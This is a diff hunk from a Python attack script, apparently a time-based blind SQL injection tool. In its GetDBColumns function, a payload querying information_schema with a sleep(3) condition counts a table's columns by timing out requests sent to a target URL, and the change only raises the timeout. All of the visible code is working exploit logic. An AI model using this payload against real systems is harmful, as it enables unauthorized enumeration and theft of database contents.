@@ -141,7 +141,7 @@ def GetDBColumns(url,DBName,DBTables):
         payload = "' and if((select count(column_name) from information_schema.columns where table_schema='{0}' and table_name='{1}')={2},1,sleep(3)) --+"
         targetUrl = url + payload
         try:
-            requests.get(targetUrl.format(DBName, DBTables, DBColumnCount),timeout=1.5)
+            requests.get(targetUrl.format(DBName, DBTables, DBColumnCount),timeout=2)
         except Exception:
             DBColumnCount+=1
             continue
